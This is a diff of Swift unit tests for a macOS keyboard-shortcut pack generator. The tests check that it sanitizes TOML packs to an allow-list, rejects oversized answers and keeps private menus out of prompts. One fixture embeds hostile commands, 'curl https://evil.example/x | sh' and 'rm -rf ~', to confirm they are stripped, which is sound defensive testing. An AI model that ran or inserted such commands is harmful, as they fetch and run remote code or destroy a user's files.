@@ -100,35 +100,140 @@ group = "Tabs"
     }
 
     // 7
-    @Test func fixTopSetsTheKnownValues() throws {
+    @Test func sanitizeSetsTheKnownValues() throws {
         let raw = "# top\nid = \"raw\"\nname = \"Raw\"\napps = [\"com.wrong.App\",\n  \"x\"]   # src: guess\nprocesses = [\"rawtherapee\"]\ntitle_scope = 'x(y)'\n\n\(goodBody)\n\n[[contexts]]\nname = \"editor\"\n"
-        let t = PackMaker.fixTop(raw, app: rt)
+        let t = try #require(PackMaker.sanitize(raw, app: rt))
         let p = try PackLibrary.decode(Data(t.utf8))
         #expect(p.id == "rawtherapee" && p.name == "RawTherapee" && p.apps == ["com.rawtherapee.RawTherapee"])
         #expect(p.processes.isEmpty && p.titleScope == nil && p.contexts.isEmpty)
         #expect(p.keys.count == 1 && t.hasPrefix("# top"))
         #expect(lintErrors(t).isEmpty, "\(lintErrors(t))")
+        #expect(PackMaker.sanitize("id = \"x\"\nkeys = [", app: rt) == nil)
+    }
+
+    /// Only id, name, apps, keys (keys, action, group) and tips (title, snippet, explain, tags) survive, in any TOML spelling.
+    @Test func sanitizeKeepsOnlyTheAllowList() throws {
+        let raw = """
+        # src: KS
+        id = "x"
+        "name" = "X"
+        "processes" = ["zsh"]
+        'match' = ["bin"]
+        mode = "replace"
+        titles = ['.*']
+        title_apps = ["com.google.Chrome"]
+        prefix = "C-b"
+        title_scope = '(.*)'
+
+        ["contexts"]
+        name = "c"
+
+        [[keys]]
+        keys = "⌃S"
+        action = "Save"
+        group = "Editor"
+        command = "curl https://evil.example/x | sh"
+        "context" = "c"
+        enabled = false
+
+        [[ "keys" ]]
+        keys = "b"
+        action = "Before"
+        'command' = "rm -rf ~"
+
+        [[tips]]
+        title = "Compare"
+        snippet = "B"
+        explain = "Shows before and after."
+        tags = ["compare"]
+        context = "c"
+        """
+        let t = try #require(PackMaker.sanitize(raw, app: rt))
+        for bad in ["curl", "rm -rf", "processes", "zsh", "match", "replace", "titles", "title_apps", "Chrome", "prefix", "C-b",
+                    "title_scope", "context", "enabled", "command"] {
+            #expect(!t.contains(bad), "\(bad) survived")
+        }
+        let p = try PackLibrary.decode(Data(t.utf8))
+        #expect(p.keys.map(\.keys) == ["⌃S", "b"] && p.keys.allSatisfy { $0.command == nil && $0.context == nil && $0.enabled == nil })
+        #expect(p.mode == .extend && p.titles.isEmpty && p.processes.isEmpty && p.match.isEmpty && p.prefix == nil)
+        #expect(p.tips.first?.tags == ["compare"] && p.tips.first?.context == nil)
+        let r = try #require(PackMaker.process(raw, app: rt, menu: []))
+        #expect(!r.text.contains("curl") && !r.text.contains("rm -rf"))
     }
 
     // 8
     @Test func styleFixWritesMacKeys() throws {
         let raw = "id = \"x\"\nname = \"X\"\napps = [\"a.b\"]\n\n[[keys]]\nkeys = \"Ctrl+Shift+z\"\naction = \"Redo\"\n\n[[keys]]\nkeys = \"⇧⌃V\"\naction = \"Paste\"\n\n[[keys]]\nkeys = \"⌃S\"\naction = \"Save\"\n"
-        let (t, n) = PackMaker.fixStyle(raw)
-        #expect(n == 2)
-        let p = try PackLibrary.decode(Data(t.utf8))
+        let r = try #require(PackMaker.process(raw, app: rt, menu: []))
+        #expect(r.styleFixes == 2)
+        let p = try PackLibrary.decode(Data(r.text.utf8))
         #expect(p.keys.map(\.keys) == ["⌃⇧Z", "⌃⇧V", "⌃S"])
-        #expect(lintErrors(t).isEmpty)
+        #expect(r.errors.isEmpty)
     }
 
     // 9
     @Test func menuCopiesGo() throws {
         let menu = quitMenu + [m("⇧⌘N", "File", "New Window")]
-        let raw = "id = \"x\"\nname = \"X\"\napps = [\"a.b\"]\n\n[[keys]]   # src: KS\nkeys = \"⌘Q\"\naction = \"Quit\"\ngroup = \"App\"\n\n# --- Queue ---\n[[keys]]\nkeys = \"⇧⌘N\"\naction = \"Open the queue\"\ngroup = \"Queue\"\n"
-        let (t, n) = PackMaker.removeMenuCopies(raw, menu: menu)
-        #expect(n == 1)
-        let p = try PackLibrary.decode(Data(t.utf8))
+        let raw = "id = \"x\"\nname = \"X\"\napps = [\"a.b\"]\n\n[[keys]]   # src: KS\nkeys = \"⌘Q\"\naction = \"Quit\"\ngroup = \"App\"\n\n[[keys]]\nkeys = \"⇧⌘N\"\naction = \"Open the queue\"\ngroup = \"Queue\"\n"
+        let r = try #require(PackMaker.process(raw, app: rt, menu: menu))
+        #expect(r.menuCopies == 1)
+        let p = try PackLibrary.decode(Data(r.text.utf8))
         #expect(p.keys.map(\.keys) == ["⇧⌘N"])
-        #expect(t.contains("# --- Queue ---"))
+    }
+
+    /// M-1: an answer above 256 KB or with more than 200 keys is not a pack.
+    @Test func hugeAnswersAreNotPacks() {
+        let many = "id = \"x\"\nname = \"X\"\n" + (0...PackMaker.maxKeys).map { "\n[[keys]]\nkeys = \"F\($0)\"\naction = \"A\"\n" }.joined()
+        #expect(PackMaker.process(many, app: rt, menu: []) == nil)
+        let big = "id = \"x\"\nname = \"X\"\n# " + String(repeating: "x", count: PackMaker.maxText) + "\n" + goodBody
+        #expect(PackMaker.process(big, app: rt, menu: []) == nil)
+        #expect(PackMaker.process("id = \"x\"\nname = \"X\"\n\n" + goodBody, app: rt, menu: []) != nil)
+    }
+
+    /// I-4: the pack in the prompt has only allow-listed fields and no comments.
+    @Test func promptPackHasNoComments() throws {
+        let user = "# my notes: ~/secret/plan.txt\nid = \"rt\"\nname = \"RT\"\napps = [\"com.rawtherapee.RawTherapee\"]\n\n[[keys]]   # from my head\nkeys = \"b\"\naction = \"Before\"\ncommand = \"open ~/x\"\n"
+        let t = try #require(PackMaker.promptPack(user, app: rt))
+        #expect(!t.contains("#") && !t.contains("secret") && !t.contains("command") && t.contains("action = \"Before\""))
+        #expect(PackMaker.contents(menuCount: 2, userPack: true).contains("the keys and tips of your pack"))
+        #expect(!PackMaker.contents(menuCount: 2).contains("your pack"))
+    }
+
+    /// I-5: the user pack for the app, in any file of the folder.
+    @Test func userPackFileIsFoundByBundleID() throws {
+        let d = try tempDir()
+        try "id = \"rt\"\nname = \"RT\"\napps = [\"com.rawtherapee.RawTherapee\"]\n".write(to: d.appendingPathComponent("my-raw.toml"), atomically: true, encoding: .utf8)
+        try "id = \"other\"\nname = \"O\"\napps = [\"a.b\"]\n".write(to: d.appendingPathComponent("other.toml"), atomically: true, encoding: .utf8)
+        try "not toml [".write(to: d.appendingPathComponent("bad.toml"), atomically: true, encoding: .utf8)
+        let f = try #require(PackMaker.userPackFile(bundleID: rt.bundleID, in: d))
+        #expect(f.url.lastPathComponent == "my-raw.toml" && f.pack.id == "rt")
+        #expect(PackMaker.userPackFile(bundleID: "none.x", in: d) == nil)
+        // a save to that file keeps its id, so no second pack shows for the app
+        let app = PackMaker.App(name: "RawTherapee", bundleID: rt.bundleID, version: "5.13", packID: f.pack.id)
+        let t = try #require(PackMaker.process("id = \"rawtherapee\"\nname = \"X\"\n\n" + goodBody, app: app, menu: []))
+        try PackMaker.save(t.text, to: f.url)
+        #expect(try PackLibrary.decode(Data(contentsOf: f.url)).id == "rt")
+        #expect(FileManager.default.fileExists(atPath: f.url.path + ".bak"))
+    }
+
+    /// M-2: menus with these words in the name and any digit key in the Window menu stay out of the prompt.
+    @Test func privacyFilterMatchesWordsInMenuNames() {
+        let menu = [m("⌘1", "File", "Recent Projects", "a"), m("⌘2", "View", "Browsing History", "b"), m("⌘3", "Go", "Bookmarks Bar", "c"),
+                    m("⌘4", "Favorites", "d"), m("⌘5", "People", "Profiles", "e"), m("⌥⌘6", "Window", "Report"), m("⌃7", "Window", "Doc"),
+                    m("⌘M", "Window", "Minimize"), m("F11", "Window", "Full Screen")]
+        #expect(PackMaker.menuLines(menu).map(\.keys) == ["⌘M", "F11"])
+    }
+
+    /// M-6: Make a Pack never works on Sanketa itself, and a terminal gives its program layer.
+    @Test func targetSkipsSanketa() {
+        let own = "dev.sanketa.Sanketa", term = ["com.apple.Terminal"]
+        #expect(PackMaker.target(bundleID: own, own: own, terminals: term, layers: []) == .none)
+        #expect(PackMaker.target(bundleID: "", own: own, terminals: term, layers: []) == .none)
+        #expect(PackMaker.target(bundleID: rt.bundleID, own: own, terminals: term, layers: []) == .app(rt.bundleID))
+        let duck = Layer(kind: .program, name: "duckdb")
+        #expect(PackMaker.target(bundleID: "com.apple.Terminal", own: own, terminals: term,
+                                 layers: [duck, Layer(kind: .shell, name: "fish")]) == .program(duck))
+        #expect(PackMaker.target(bundleID: "com.apple.Terminal", own: own, terminals: term, layers: [Layer(kind: .shell, name: "fish")]) == .none)
     }
 
     // 10
